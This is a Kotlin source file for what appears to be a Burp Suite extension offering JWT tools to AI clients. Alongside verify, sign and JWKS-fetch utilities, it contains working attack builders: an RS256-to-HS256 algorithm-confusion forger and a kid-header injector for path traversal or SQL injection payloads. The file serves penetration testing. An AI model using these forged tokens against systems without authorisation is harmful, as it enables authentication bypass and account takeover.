package io.burpmcp.ultimate.tools

import burp.api.montoya.MontoyaApi
import io.burpmcp.ultimate.mcp.Args
import io.burpmcp.ultimate.mcp.ErrorCodes
import io.burpmcp.ultimate.mcp.Json
import io.burpmcp.ultimate.mcp.McpException
import io.burpmcp.ultimate.mcp.ToolRegistry
import io.burpmcp.ultimate.mcp.ToolRegistry.Schema as S
import java.security.KeyFactory
import java.security.MessageDigest
import java.security.Signature
import java.security.spec.X509EncodedKeySpec
import java.util.Base64
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/**
 * JWT verification + alg-confusion attack helper.
 * (Full JWE remains complex - we cover the common HMAC/RSA cases.)
 */
object JwtTools {

    private val URL_DEC = Base64.getUrlDecoder()
    private val URL_ENC = Base64.getUrlEncoder().withoutPadding()

    /** JWT alg name (HS256/384/512) -> JCA Mac algorithm name (HmacSHA256/384/512). */
    internal fun jcaHmacName(alg: String): String = when (alg.uppercase()) {
        "HS256" -> "HmacSHA256"
        "HS384" -> "HmacSHA384"
        "HS512" -> "HmacSHA512"
        else    -> throw IllegalArgumentException("not an HMAC alg: $alg")
    }

    /**
     * Read a JSON value supplied as either a structured object/array under [objKey]
     * or as a raw JSON string under [jsonKey]. Returns the canonical JSON string,
     * or null if neither key is present. Lets AI clients pass `payload: {sub: "x"}`
     * naturally instead of pre-serializing to a string.
     */
    internal fun coerceJsonInput(args: Map<String, Any?>, objKey: String, jsonKey: String): String? {
        args[objKey]?.let { v ->
            return when (v) {
                is String -> v
                else      -> Json.write(v)
            }
        }
        return args[jsonKey]?.toString()
    }

    private fun decodeUtf8(part: String) = String(URL_DEC.decode(part))

    private fun parseAlg(header: String): String? =
        Regex("\"alg\"\\s*:\\s*\"([^\"]+)\"").find(header)?.groupValues?.get(1)

    fun register(reg: ToolRegistry, api: MontoyaApi) {

        reg.register(
            name = "jwt_verify",
            description = "Verify a JWT signature. Supports HS256/384/512 (provide secret) and RS256/384/512 (provide PEM public key).",
            inputSchema = S.obj(
                properties = mapOf(
                    "token"          to S.str("JWT"),
                    "secret"         to S.str("HMAC secret (HS*)"),
                    "public_key_pem" to S.str("RSA PEM (RS*)"),
                ),
                required = listOf("token"),
            ),
        ) { args ->
            val token = Args.str(args, "token").trim()
            val parts = token.split(".")
            require(parts.size == 3) { "JWT must have 3 parts" }
            val header  = decodeUtf8(parts[0])
            val payload = decodeUtf8(parts[1])
            val sig     = URL_DEC.decode(parts[2])
            val alg     = parseAlg(header) ?: throw McpException(ErrorCodes.VALIDATION, "no alg in header")
            val signed  = "${parts[0]}.${parts[1]}".toByteArray(Charsets.US_ASCII)

            val ok = when (alg.uppercase()) {
                "HS256", "HS384", "HS512" -> {
                    val secret = Args.strOrNull(args, "secret")
                        ?: throw McpException(ErrorCodes.VALIDATION, "secret required for $alg")
                    val mac = Mac.getInstance(jcaHmacName(alg))
                    mac.init(SecretKeySpec(secret.toByteArray(Charsets.UTF_8), mac.algorithm))
                    java.util.Arrays.equals(mac.doFinal(signed), sig)
                }
                "RS256", "RS384", "RS512" -> {
                    val pem = Args.strOrNull(args, "public_key_pem")
                        ?: throw McpException(ErrorCodes.VALIDATION, "public_key_pem required for $alg")
                    val der = pem.replace(Regex("-----.*?-----"), "").replace("\\s+".toRegex(), "")
                    val key = KeyFactory.getInstance("RSA")
                        .generatePublic(X509EncodedKeySpec(Base64.getDecoder().decode(der)))
                    val sigAlg = "SHA${alg.substring(2)}withRSA"
                    val ver = Signature.getInstance(sigAlg)
                    ver.initVerify(key); ver.update(signed); ver.verify(sig)
                }
                "NONE" -> sig.isEmpty()
                else -> throw McpException(ErrorCodes.VALIDATION, "unsupported alg $alg")
            }
            mapOf("valid" to ok, "alg" to alg, "header" to header, "payload" to payload)
        }

        reg.register(
            name = "jwt_sign",
            description = "Sign a header+payload pair to produce a JWT. Supports HS256/384/512. " +
                "Provide the payload as a JSON object via 'payload' (preferred) or as a string via 'payload_json'. " +
                "Header is optional: if omitted, a default {alg, typ:JWT} header is built from 'alg'. " +
                "Header can also be supplied as 'header' (object) or 'header_json' (string).",
            inputSchema = S.obj(
                properties = mapOf(
                    "alg"          to S.enum("HMAC alg", listOf("HS256", "HS384", "HS512"), default = "HS256"),
                    "secret"       to S.str("HMAC secret"),
                    "payload"      to mapOf("type" to "object",
                                            "description" to "Payload as a JSON object (preferred). Provide either this or payload_json.",
                                            "additionalProperties" to true),
                    "payload_json" to S.str("Payload as a raw JSON string. Provide either this or payload."),
                    "header"       to mapOf("type" to "object",
                                            "description" to "Header as a JSON object (optional). Defaults to {alg, typ:JWT}.",
                                            "additionalProperties" to true),
                    "header_json"  to S.str("Header as a raw JSON string (optional)."),
                ),
                required = listOf("secret"),
            ),
        ) { args ->
            val alg = (Args.strOrNull(args, "alg") ?: "HS256").uppercase()
            require(alg in setOf("HS256", "HS384", "HS512")) { "unsupported alg $alg" }
            val headerStr = coerceJsonInput(args, "header", "header_json")
                ?: """{"alg":"$alg","typ":"JWT"}"""
            val payloadStr = coerceJsonInput(args, "payload", "payload_json")
                ?: throw McpException(ErrorCodes.VALIDATION,
                    "missing payload — supply either 'payload' (JSON object) or 'payload_json' (string)")
            val secret = Args.str(args, "secret")
            val h = URL_ENC.encodeToString(headerStr.toByteArray(Charsets.UTF_8))
            val p = URL_ENC.encodeToString(payloadStr.toByteArray(Charsets.UTF_8))
            val mac = Mac.getInstance(jcaHmacName(alg))
            mac.init(SecretKeySpec(secret.toByteArray(Charsets.UTF_8), mac.algorithm))
            val sig = URL_ENC.encodeToString(mac.doFinal("$h.$p".toByteArray(Charsets.US_ASCII)))
            mapOf(
                "token"  to "$h.$p.$sig",
                "alg"    to alg,
                "header" to headerStr,
            )
        }

        reg.register(
            name = "jwt_alg_confusion",
            description = "Build an alg-confusion attack payload: re-sign the JWT with HS256 using the server's RSA PUBLIC key as the HMAC secret.",
            inputSchema = S.obj(
                properties = mapOf(
                    "token"          to S.str("Original JWT"),
                    "public_key_pem" to S.str("Server's RSA public key in PEM"),
                ),
                required = listOf("token", "public_key_pem"),
            ),
        ) { args ->
            val token = Args.str(args, "token").trim()
            val parts = token.split(".")
            require(parts.size == 3) { "JWT must have 3 parts" }
            val header  = decodeUtf8(parts[0])
            val payload = decodeUtf8(parts[1])
            // Force alg=HS256 in the header.
            val newHeader = header.replace(Regex("\"alg\"\\s*:\\s*\"[^\"]+\""), "\"alg\":\"HS256\"")
                .let { if ("\"alg\"" in it) it else it.replaceFirst("{", "{\"alg\":\"HS256\",") }
            val h = URL_ENC.encodeToString(newHeader.toByteArray(Charsets.UTF_8))
            val p = URL_ENC.encodeToString(payload.toByteArray(Charsets.UTF_8))
            val pemBytes = Args.str(args, "public_key_pem").toByteArray(Charsets.US_ASCII)  // raw PEM as secret bytes
            val mac = Mac.getInstance("HmacSHA256")
            mac.init(SecretKeySpec(pemBytes, "HmacSHA256"))
            val sig = URL_ENC.encodeToString(mac.doFinal("$h.$p".toByteArray(Charsets.US_ASCII)))
            mapOf(
                "attack_token" to "$h.$p.$sig",
                "header_used"  to newHeader,
                "note"         to "Targets servers that accept HS256 with the same RSA public key as the HMAC secret. " +
                                  "Try also: signing with the PEM after stripping headers / decoded DER bytes.",
            )
        }

        reg.register(
            name = "jwt_kid_inject",
            description = "Build a JWT with a kid header pointing somewhere injectable (path traversal / SQLi). " +
                "Provide payload as 'payload' (JSON object, preferred) or 'payload_json' (string). " +
                "Header is optional: if omitted, a default {alg:HS256, typ:JWT} header is used; " +
                "the kid is then injected into that header.",
            inputSchema = S.obj(
                properties = mapOf(
                    "kid"          to S.str("Malicious kid value (the injection payload)"),
                    "secret"       to S.str("HMAC secret used to sign the resulting token"),
                    "payload"      to mapOf("type" to "object",
                                            "description" to "Payload as JSON object (preferred). Provide either this or payload_json.",
                                            "additionalProperties" to true),
                    "payload_json" to S.str("Payload as raw JSON string. Provide either this or payload."),
                    "header"       to mapOf("type" to "object",
                                            "description" to "Base header as JSON object (kid will be set/overridden).",
                                            "additionalProperties" to true),
                    "header_json"  to S.str("Base header as raw JSON string (optional)."),
                ),
                required = listOf("kid", "secret"),
            ),
        ) { args ->
            val baseHeader = coerceJsonInput(args, "header", "header_json")
                ?: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}"
            val kid = Args.str(args, "kid").replace("\"", "\\\"")
            val withKid = if ("\"kid\"" in baseHeader)
                baseHeader.replace(Regex("\"kid\"\\s*:\\s*\"[^\"]*\""), "\"kid\":\"$kid\"")
            else
                baseHeader.replaceFirst("{", "{\"kid\":\"$kid\",")
            val payloadStr = coerceJsonInput(args, "payload", "payload_json")
                ?: throw McpException(ErrorCodes.VALIDATION,
                    "missing payload — supply either 'payload' (JSON object) or 'payload_json' (string)")
            val h = URL_ENC.encodeToString(withKid.toByteArray(Charsets.UTF_8))
            val p = URL_ENC.encodeToString(payloadStr.toByteArray(Charsets.UTF_8))
            val mac = Mac.getInstance("HmacSHA256")
            mac.init(SecretKeySpec(Args.str(args, "secret").toByteArray(Charsets.UTF_8), "HmacSHA256"))
            val sig = URL_ENC.encodeToString(mac.doFinal("$h.$p".toByteArray(Charsets.US_ASCII)))
            mapOf("token" to "$h.$p.$sig", "header" to withKid)
        }

        reg.register(
            name = "jwt_jwks_fetch",
            description = "Fetch a JWKS document.",
            inputSchema = S.obj(
                properties = mapOf("url" to S.str("JWKS URL")),
                required = listOf("url"),
            ),
        ) { args ->
            val u = java.net.URI(Args.str(args, "url"))
            val secure = u.scheme.equals("https", ignoreCase = true)
            val port = if (u.port == -1) (if (secure) 443 else 80) else u.port
            val path = u.rawPath.ifEmpty { "/" } + (if (u.rawQuery != null) "?${u.rawQuery}" else "")
            val raw = "GET $path HTTP/1.1\r\nHost: ${u.host}\r\nAccept: application/json\r\n\r\n"
            val req = burp.api.montoya.http.message.requests.HttpRequest.httpRequest(
                burp.api.montoya.http.HttpService.httpService(u.host, port, secure), raw)
            val body = api.http().sendRequest(req).response().bodyToString()
            mapOf("body" to body)
        }
    }
}
